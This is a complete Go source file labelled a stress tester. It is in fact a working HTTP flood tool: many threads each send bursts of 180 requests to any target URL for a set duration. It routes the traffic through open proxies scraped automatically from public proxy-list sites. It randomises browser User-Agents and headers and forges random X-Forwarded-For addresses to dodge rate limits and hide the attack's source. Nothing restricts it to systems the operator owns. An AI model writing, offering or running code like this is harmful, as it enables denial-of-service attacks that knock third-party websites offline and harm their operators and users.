// File: stress-tester.go
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Global state for HTTP request templates
var (
	httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
	languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

// StressConfig holds command-line configuration
type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
	ProxyMgr   *ProxyManager
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	// Define flags
	proxySourcesFlag := flag.String("proxy-sources", "", "Comma-separated URLs of proxy lists. If empty, will use built-in defaults.")
	proxyRefreshFlag := flag.Duration("proxy-refresh", 30*time.Minute, "How often to refresh/scrape proxy sources.")
	proxyTimeoutFlag := flag.Duration("proxy-timeout", 3*time.Second, "Timeout for dialing proxies when testing/using them.")
	noFailoverFlag := flag.Bool("no-proxy-failover", false, "If set, do not remove proxies from pool on failure.")

	flag.Parse()
	// Remaining args are positional: URL, THREADS, DURATION_SEC, [CUSTOM_HOST]
	args := flag.Args()
	if len(args) < 3 {
		fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST] [flags]")
		flag.PrintDefaults()
		os.Exit(1)
	}
	rawURL := args[0]
	threads, err := strconv.Atoi(args[1])
	if err != nil || threads <= 0 {
		fmt.Println("Invalid THREADS:", args[1])
		os.Exit(1)
	}
	durSec, err := strconv.Atoi(args[2])
	if err != nil || durSec <= 0 {
		fmt.Println("Invalid DURATION_SEC:", args[2])
		os.Exit(1)
	}
	custom := ""
	if len(args) > 3 {
		custom = args[3]
	}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		os.Exit(1)
	}
	port := determinePort(parsed)
	path := parsed.RequestURI()

	// Build ProxyManager
	var sources []string
	if *proxySourcesFlag != "" {
		for _, s := range strings.Split(*proxySourcesFlag, ",") {
			s = strings.TrimSpace(s)
			if s != "" {
				sources = append(sources, s)
			}
		}
	} else {
		// Built-in defaults: popular free proxy-list sites
		sources = []string{
			"https://free-proxy-list.net/",
			"https://www.sslproxies.org/",
			"https://www.proxy-list.download/HTTPS",
			"https://www.us-proxy.org/",
			// Add more known endpoints if desired...
		}
	}
	proxyMgr := NewProxyManager(sources, *proxyRefreshFlag, *proxyTimeoutFlag, !*noFailoverFlag)
	proxyMgr.Start() // begin initial fetch + periodic refresh

	cfg := StressConfig{
		Target:     parsed,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: custom,
		Port:       port,
		Path:       path,
		ProxyMgr:   proxyMgr,
	}
	fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v, proxies-enabled=%v\n",
		rawURL, path, threads, cfg.Duration, true)
	runWorkers(cfg)
	fmt.Println("Stress test completed.")
}

// determinePort extracts port from URL or defaults to 80/443
func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

func runWorkers(cfg StressConfig) {
	var wg sync.WaitGroup
	stopCh := time.After(cfg.Duration)
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ticker := time.NewTicker(60 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-stopCh:
					return
				case <-ticker.C:
					sendBurst(cfg)
				}
			}
		}(i)
	}
	wg.Wait()
}

// sendBurst picks a proxy from ProxyManager, dials through it (or direct if none), then sends 180 requests back-to-back
func sendBurst(cfg StressConfig) {
	proxyAddr := ""
	if cfg.ProxyMgr != nil {
		proxyAddr = cfg.ProxyMgr.GetProxy() // may return "" if pool empty
	}
	var conn net.Conn
	var err error
	tlsCfg := &tls.Config{
		ServerName:         cfg.Target.Hostname(),
		InsecureSkipVerify: true,
	}
	targetHostPort := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)

	if proxyAddr == "" {
		// No proxy available → direct dial
		conn, err = dialPlainOrTLS(targetHostPort, tlsCfg, cfg.Target.Scheme == "https")
		if err != nil {
			fmt.Printf("[direct dial error] %v\n", err)
			return
		}
	} else {
		// Dial via proxy
		conn, err = dialViaHTTPProxy(proxyAddr, targetHostPort, tlsCfg, cfg.Target.Scheme == "https", cfg.ProxyMgr.timeout)
		if err != nil {
			// remove this proxy from pool if configured to failover
			cfg.ProxyMgr.ReportFailure(proxyAddr)
			fmt.Printf("[proxy %s dial error] %v\n", proxyAddr, err)
			return
		}
	}
	defer conn.Close()

	// Send 180 requests in one connection
	for i := 0; i < 180; i++ {
		method := httpMethods[rand.Intn(len(httpMethods))]
		header, body := buildRequest(cfg, method, proxyAddr != "")
		var bufs net.Buffers
		bufs = append(bufs, []byte(header))
		if method == "POST" {
			bufs = append(bufs, body)
		}
		if _, err := bufs.WriteTo(conn); err != nil {
			if proxyAddr != "" {
				cfg.ProxyMgr.ReportFailure(proxyAddr)
			}
			fmt.Printf("[write error] %v\n", err)
			return
		}
	}
}

// dialPlainOrTLS dials directly to target; if isHTTPS, wraps in TLS
func dialPlainOrTLS(address string, tlsCfg *tls.Config, isHTTPS bool) (net.Conn, error) {
	if isHTTPS {
		return tls.Dial("tcp", address, tlsCfg)
	}
	return net.DialTimeout("tcp", address, 5*time.Second)
}

// dialViaHTTPProxy dials the proxy, then does CONNECT if isHTTPS, or plain HTTP otherwise.
// proxyTimeout is timeout for the initial Dial and CONNECT response read.
func dialViaHTTPProxy(proxyAddr, targetHostPort string, tlsCfg *tls.Config, isHTTPS bool, proxyTimeout time.Duration) (net.Conn, error) {
	// Dial to proxy
	conn, err := net.DialTimeout("tcp", proxyAddr, proxyTimeout)
	if err != nil {
		return nil, err
	}
	// For HTTPS: send CONNECT
	if isHTTPS {
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: keep-alive\r\n\r\n",
			targetHostPort, targetHostPort)
		if _, err := conn.Write([]byte(connectReq)); err != nil {
			conn.Close()
			return nil, err
		}
		// Read proxy response until blank line
		buf := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(proxyTimeout))
		n, err := conn.Read(buf)
		if err != nil {
			conn.Close()
			return nil, err
		}
		resp := string(buf[:n])
		if !strings.Contains(resp, " 200 ") {
			conn.Close()
			firstLine := strings.SplitN(resp, "\r\n", 2)[0]
			return nil, fmt.Errorf("proxy CONNECT failed: %s", firstLine)
		}
		// Wrap in TLS
		tlsConn := tls.Client(conn, tlsCfg)
		if err := tlsConn.Handshake(); err != nil {
			tlsConn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
	// For plain HTTP: just return conn; request lines will include full URL
	return conn, nil
}

// buildRequest constructs request headers; if viaProxy & HTTP, request line uses full URL
func buildRequest(cfg StressConfig, method string, viaProxy bool) ([]byte, []byte) {
	var buf bytes.Buffer
	hostHdr := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		hostHdr = cfg.CustomHost
	}
	// Request line
	if viaProxy && cfg.Target.Scheme == "http" {
		// full URL in request line
		// cfg.Target.Host may include port if non-default
		buf.WriteString(fmt.Sprintf("%s %s://%s%s HTTP/1.1\r\n", method, cfg.Target.Scheme, cfg.Target.Host, cfg.Path))
	} else {
		buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, cfg.Path))
	}
	// Host header: include port if non-standard
	buf.WriteString("Host: " + hostHdr)
	if cfg.Port != 80 && cfg.Port != 443 {
		buf.WriteString(":" + strconv.Itoa(cfg.Port))
	}
	buf.WriteString("\r\n")
	writeCommonHeaders(&buf)

	var body []byte
	if method == "POST" {
		ct := contentTypes[rand.Intn(len(contentTypes))]
		body = createBody(ct)
		buf.WriteString("Content-Type: " + ct + "\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n")
	}
	// Referer and Connection
	buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
	out := make([]byte, buf.Len())
	copy(out, buf.Bytes())
	return out, body
}

func writeCommonHeaders(buf *bytes.Buffer) {
	buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
	buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
	buf.WriteString("Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n")
	buf.WriteString("Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\n")
	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func createBody(contentType string) []byte {
	var b bytes.Buffer
	switch contentType {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			vals.Set(randomString(5), randomString(8))
		}
		b.WriteString(vals.Encode())
	case "application/json":
		b.WriteByte('{')
		for i := 0; i < 3; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
		}
		b.WriteByte('}')
	case "text/plain":
		b.WriteString("text_" + randomString(12))
	}
	return b.Bytes()
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randomUserAgent() string {
	osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
	os := osList[rand.Intn(len(osList))]
	switch rand.Intn(3) {
	case 0:
		v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/%s", os, v, v)
	case 1:
		v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
	default:
		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/13.1 Safari/%s", os, v, v)
	}
}

// ------------- ProxyManager -------------

type ProxyManager struct {
	sources         []string
	refreshInterval time.Duration
	timeout         time.Duration
	failover        bool

	mu      sync.RWMutex
	proxies []string
	quitCh  chan struct{}
	regexIP *regexp.Regexp
}

// NewProxyManager: sources is slice of URLs to scrape; refreshInterval; dial timeout; failover=true means drop bad proxies
func NewProxyManager(sources []string, refreshInterval, timeout time.Duration, failover bool) *ProxyManager {
	// Simple regex to find IP:PORT in HTML or text
	reg := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b`)
	pm := &ProxyManager{
		sources:         sources,
		refreshInterval: refreshInterval,
		timeout:         timeout,
		failover:        failover,
		proxies:         make([]string, 0),
		quitCh:          make(chan struct{}),
		regexIP:         reg,
	}
	return pm
}

// Start initial fetch and periodic refresh
func (pm *ProxyManager) Start() {
	// Initial fetch immediately
	pm.fetchAllSources()
	// Periodic
	pmTicker := time.NewTicker(pm.refreshInterval)
	go func() {
		for {
			select {
			case <-pmTicker.C:
				pm.fetchAllSources()
			case <-pm.quitCh:
				pmTicker.Stop()
				return
			}
		}
	}()
}

// Stop the periodic fetch (if needed)
func (pm *ProxyManager) Stop() {
	close(pm.quitCh)
}

// GetProxy returns a random proxy "host:port", or "" if none available
func (pm *ProxyManager) GetProxy() string {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	if len(pm.proxies) == 0 {
		return ""
	}
	return pm.proxies[rand.Intn(len(pm.proxies))]
}

// ReportFailure drops a proxy if failover is enabled
func (pm *ProxyManager) ReportFailure(proxy string) {
	if !pm.failover {
		return
	}
	pm.mu.Lock()
	defer pm.mu.Unlock()
	for i, p := range pm.proxies {
		if p == proxy {
			pm.proxies = append(pm.proxies[:i], pm.proxies[i+1:]...)
			break
		}
	}
}

// fetchAllSources scrapes each source URL and merges into pool
func (pm *ProxyManager) fetchAllSources() {
	for _, src := range pm.sources {
		proxies, err := pm.scrapeSource(src)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[proxy scrape error] %s: %v\n", src, err)
			continue
		}
		pm.mergeProxies(proxies)
	}
}

// mergeProxies adds new proxies not already in pool
func (pm *ProxyManager) mergeProxies(newList []string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	existing := make(map[string]struct{}, len(pm.proxies))
	for _, p := range pm.proxies {
		existing[p] = struct{}{}
	}
	for _, p := range newList {
		if _, ok := existing[p]; !ok {
			pm.proxies = append(pm.proxies, p)
		}
	}
	// Shuffle after merging
	rand.Shuffle(len(pm.proxies), func(i, j int) {
		pm.proxies[i], pm.proxies[j] = pm.proxies[j], pm.proxies[i]
	})
}

// scrapeSource fetches the URL and returns a slice of "IP:PORT"
func (pm *ProxyManager) scrapeSource(src string) ([]string, error) {
	client := http.Client{
		Timeout: pm.timeout,
	}
	resp, err := client.Get(src)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20)) // limit ~2MB
	if err != nil {
		return nil, err
	}
	ct := resp.Header.Get("Content-Type")
	if strings.Contains(ct, "text/plain") || strings.HasSuffix(strings.ToLower(src), ".txt") {
		return pm.parsePlainText(bodyBytes), nil
	}
	return pm.parseWithRegex(bodyBytes), nil
}

func (pm *ProxyManager) parsePlainText(data []byte) []string {
	var res []string
	scanner := bufio.NewScanner(bytes.NewReader(data))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if pm.regexIP.MatchString(line) {
			m := pm.regexIP.FindString(line)
			if m != "" && validIPPort(m) {
				res = append(res, m)
			}
		}
	}
	return res
}

func (pm *ProxyManager) parseWithRegex(data []byte) []string {
	matches := pm.regexIP.FindAll(data, -1)
	seen := make(map[string]struct{})
	var res []string
	for _, m := range matches {
		s := string(m)
		if validIPPort(s) {
			if _, ok := seen[s]; !ok {
				seen[s] = struct{}{}
				res = append(res, s)
			}
		}
	}
	return res
}

// validate "IP:PORT": octets 0-255, port 1-65535
func validIPPort(s string) bool {
	parts := strings.Split(s, ":")
	if len(parts) != 2 {
		return false
	}
	ip := parts[0]
	portStr := parts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		return false
	}
	octets := strings.Split(ip, ".")
	if len(octets) != 4 {
		return false
	}
	for _, o := range octets {
		v, err := strconv.Atoi(o)
		if err != nil || v < 0 || v > 255 {
			return false
		}
	}
	return true
}
